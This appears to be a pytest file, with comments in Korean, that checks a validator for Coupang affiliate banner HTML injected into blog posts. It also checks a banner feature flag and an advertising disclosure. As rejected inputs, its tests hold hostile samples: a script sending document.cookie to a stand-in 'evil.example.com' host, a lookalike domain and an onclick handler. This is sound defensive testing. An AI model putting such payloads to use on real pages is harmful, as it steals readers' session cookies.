# -*- coding: utf-8 -*-
"""쿠팡파트너스 HTML 배너 삽입의 안전 규칙을 고정합니다.

이 HTML은 손대지 않고 글 본문에 들어가 독자 브라우저에서 실행됩니다.
그래서 쿠팡이 준 코드만 통과해야 하고, 기능이 꺼져 있으면 아무것도
들어가면 안 됩니다 (애드센스 심사 중에는 꺼 둡니다).
"""
import os
import sys

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import coupang_affiliate as ca  # noqa: E402


# 쿠팡이 실제로 주는 두 가지 형태
IFRAME_BANNER = (
    '<iframe src="https://ads-partners.coupang.com/widgets.html'
    '?id=123456&template=carousel&trackingCode=AF1234567&width=680&height=140" '
    'width="680" height="140" frameborder="0" scrolling="no"></iframe>'
)

SCRIPT_BANNER = (
    '<script src="https://ads-partners.coupang.com/g.js"></script>'
    '<script>new PartnersCoupang.G({"id":123456,"template":"carousel",'
    '"trackingCode":"AF1234567","width":"680","height":"140"});</script>'
)


# ── 통과해야 하는 것 ──────────────────────────────────────────────────────

def test_iframe_banner_passes():
    ok, why = ca.validate_banner_html(IFRAME_BANNER)
    assert ok, why


def test_script_banner_passes():
    ok, why = ca.validate_banner_html(SCRIPT_BANNER)
    assert ok, why


def test_image_link_banner_passes():
    html = ('<a href="https://link.coupang.com/a/abcdEF" target="_blank">'
            '<img src="https://image6.coupangcdn.com/image/x.jpg"></a>')
    ok, why = ca.validate_banner_html(html)
    assert ok, why


# ── 막아야 하는 것 ────────────────────────────────────────────────────────

def test_non_coupang_host_is_rejected():
    html = '<iframe src="https://evil.example.com/widgets.html"></iframe>'
    ok, why = ca.validate_banner_html(html)
    assert ok is False
    assert "쿠팡 도메인" in why


def test_lookalike_host_is_rejected():
    """coupang.com.evil.kr 같은 주소가 통과하면 안 됩니다."""
    html = '<iframe src="https://ads-partners.coupang.com.evil.kr/x.html"></iframe>'
    assert ca.validate_banner_html(html)[0] is False


def test_event_attribute_is_rejected():
    html = f'<div onclick="alert(1)">{IFRAME_BANNER}</div>'
    ok, why = ca.validate_banner_html(html)
    assert ok is False
    assert "이벤트 속성" in why


def test_disallowed_tag_is_rejected():
    html = '<form action="https://link.coupang.com/a/x"><input name="a"></form>'
    ok, why = ca.validate_banner_html(html)
    assert ok is False
    assert "허용하지 않는 태그" in why


def test_foreign_inline_script_is_rejected():
    html = '<script>fetch("https://evil.example.com?c="+document.cookie)</script>'
    assert ca.validate_banner_html(html)[0] is False


def test_script_disguised_as_coupang_but_exfiltrating_is_rejected():
    """PartnersCoupang을 끼워 넣어도 위험한 호출이 있으면 막습니다."""
    html = ('<script>new PartnersCoupang.G({});'
            'fetch("https://ads-partners.coupang.com/x")</script>')
    ok, why = ca.validate_banner_html(html)
    assert ok is False
    assert "fetch(" in why


def test_empty_html_is_rejected():
    assert ca.validate_banner_html("")[0] is False
    assert ca.validate_banner_html("   ")[0] is False


def test_plain_text_is_rejected():
    assert ca.validate_banner_html("<p>여기 배너 넣어주세요</p>")[0] is False


def test_protocol_relative_coupang_url_passes():
    html = '<iframe src="//ads-partners.coupang.com/widgets.html?id=1"></iframe>'
    assert ca.validate_banner_html(html)[0] is True


# ── 기능 스위치 ───────────────────────────────────────────────────────────

_BANNER_ENTRY = {
    "id": "b-1", "name": "쿠팡 배너", "type": "html",
    "html": IFRAME_BANNER, "keywords": [], "blogs": [], "enabled": True,
}
_LINK_ENTRY = {
    "id": "l-1", "name": "쿠팡", "type": "link",
    "url": "https://link.coupang.com/a/gLrJ", "keywords": [], "blogs": [], "enabled": True,
}


@pytest.fixture
def links(monkeypatch):
    def _set(entries):
        monkeypatch.setattr(ca, "load_affiliate_links", lambda: entries)
    return _set


def test_banner_is_skipped_when_flag_is_off(links, monkeypatch):
    """애드센스 심사 중 기본 상태 — 배너가 본문에 들어가면 안 됩니다."""
    links([_BANNER_ENTRY])
    monkeypatch.setattr(ca, "banners_enabled", lambda: False)

    out = ca.inject_affiliate_section("<p>본문</p>", "재테크", {"id": "blog3"})
    assert out == "<p>본문</p>"
    assert "ads-partners" not in out


def test_banner_is_inserted_when_flag_is_on(links, monkeypatch):
    links([_BANNER_ENTRY])
    monkeypatch.setattr(ca, "banners_enabled", lambda: True)

    out = ca.inject_affiliate_section("<p>본문</p>", "재테크", {"id": "blog3"})
    assert "ads-partners.coupang.com/widgets.html" in out
    assert out.startswith("<p>본문</p>")


def test_text_links_are_unaffected_by_the_banner_flag(links, monkeypatch):
    """배너 스위치는 배너만 끕니다 — 기존 텍스트 링크는 그대로입니다."""
    links([_LINK_ENTRY])
    monkeypatch.setattr(ca, "banners_enabled", lambda: False)

    out = ca.inject_affiliate_section("<p>본문</p>", "재테크", {"id": "blog3"})
    assert "link.coupang.com/a/gLrJ" in out


def test_invalid_banner_is_skipped_not_inserted(links, monkeypatch):
    bad = dict(_BANNER_ENTRY, html='<iframe src="https://evil.example.com/x"></iframe>')
    links([bad])
    monkeypatch.setattr(ca, "banners_enabled", lambda: True)

    out = ca.inject_affiliate_section("<p>본문</p>", "재테크", {"id": "blog3"})
    assert out == "<p>본문</p>"
    assert "evil.example.com" not in out


def test_link_and_banner_together(links, monkeypatch):
    links([_LINK_ENTRY, _BANNER_ENTRY])
    monkeypatch.setattr(ca, "banners_enabled", lambda: True)

    out = ca.inject_affiliate_section("<p>본문</p>", "재테크", {"id": "blog3"})
    assert "link.coupang.com/a/gLrJ" in out
    assert "ads-partners.coupang.com" in out


def test_disclosure_is_always_present(links, monkeypatch):
    """대가성 고지는 배너만 있을 때도 빠지면 안 됩니다 (표시광고법)."""
    links([_BANNER_ENTRY])
    monkeypatch.setattr(ca, "banners_enabled", lambda: True)

    out = ca.inject_affiliate_section("<p>본문</p>", "재테크", {"id": "blog3"})
    assert ca.DISCLOSURE in out


def test_entry_without_type_is_treated_as_link(links, monkeypatch):
    """기존에 저장된 항목에는 type 필드가 없습니다 — 링크로 봐야 합니다."""
    old = {"id": "l-0", "name": "쿠팡", "url": "https://link.coupang.com/a/old",
           "keywords": [], "blogs": [], "enabled": True}
    links([old])
    monkeypatch.setattr(ca, "banners_enabled", lambda: False)

    out = ca.inject_affiliate_section("<p>본문</p>", "재테크", {"id": "blog3"})
    assert "link.coupang.com/a/old" in out


def test_flag_default_is_off_in_the_repo():
    """feature_flags.json에 false로 적혀 있어야 합니다.

    feature_flags는 정의되지 않은 플래그를 '켜짐'으로 보기 때문에,
    이름을 빼면 배너가 조용히 켜집니다.
    """
    import json
    path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))),
                        "feature_flags.json")
    with open(path, encoding="utf-8") as f:
        flags = json.load(f)
    assert ca.BANNER_FLAG in flags, "feature_flags.json에 coupang_banner가 없습니다"
    assert flags[ca.BANNER_FLAG] is False
